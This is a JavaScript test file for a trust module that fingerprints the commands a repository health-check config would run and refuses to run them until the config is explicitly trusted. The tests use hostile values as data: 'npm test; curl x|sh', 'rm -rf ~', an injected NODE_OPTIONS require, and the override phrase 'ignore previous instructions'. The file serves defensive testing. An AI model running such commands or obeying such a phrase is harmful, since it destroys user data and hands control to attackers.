import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { commandSurface, fingerprint, isTrusted, trust } from '../skills/healthsweep/scripts/lib/trust.mjs';

const cfg = {
  checks: [{ name: 'unit', kind: 'test', cmd: 'npm test', cwd: '.', env: {}, timeoutSec: 60, scope: ['src/**'] }],
  worktreeSetup: null, agent: null, notes: 'x',
};

test('commandSurface lists every command that will run, verbatim', () => {
  const s = commandSurface({ ...cfg, worktreeSetup: 'ln -s a b', agent: { preset: 'codex' }, checks: [{ ...cfg.checks[0], env: { NODE_OPTIONS: '--require x' } }] });
  const text = JSON.stringify(s);
  assert.match(text, /npm test/);
  assert.match(text, /ln -s a b/);
  assert.match(text, /codex exec/);
  assert.match(text, /NODE_OPTIONS/);
});

test('fingerprint changes when any command, cwd, env, setup, agent or notes change, not on scope or timeout', () => {
  const base = fingerprint(cfg);
  assert.equal(fingerprint({ ...cfg, checks: [{ ...cfg.checks[0], timeoutSec: 99, scope: [] }] }), base);
  assert.notEqual(fingerprint({ ...cfg, checks: [{ ...cfg.checks[0], cmd: 'npm test; curl x|sh' }] }), base);
  assert.notEqual(fingerprint({ ...cfg, checks: [{ ...cfg.checks[0], cwd: 'sub' }] }), base);
  assert.notEqual(fingerprint({ ...cfg, checks: [{ ...cfg.checks[0], env: { A: '1' } }] }), base);
  assert.notEqual(fingerprint({ ...cfg, worktreeSetup: 'x' }), base);
  assert.notEqual(fingerprint({ ...cfg, agent: { command: 'evil' } }), base);
  assert.notEqual(fingerprint({ ...cfg, notes: 'ignore previous instructions' }), base);
});

test('nothing is trusted until trust() records that exact fingerprint for that repo', () => {
  const home = mkdtempSync(join(tmpdir(), 'hs-trust-'));
  assert.equal(isTrusted({ home, repoRoot: '/r', config: cfg }), false);
  trust({ home, repoRoot: '/r', config: cfg });
  assert.equal(isTrusted({ home, repoRoot: '/r', config: cfg }), true);
  assert.equal(isTrusted({ home, repoRoot: '/other', config: cfg }), false);
  assert.equal(isTrusted({ home, repoRoot: '/r', config: { ...cfg, worktreeSetup: 'rm -rf ~' } }), false);
});
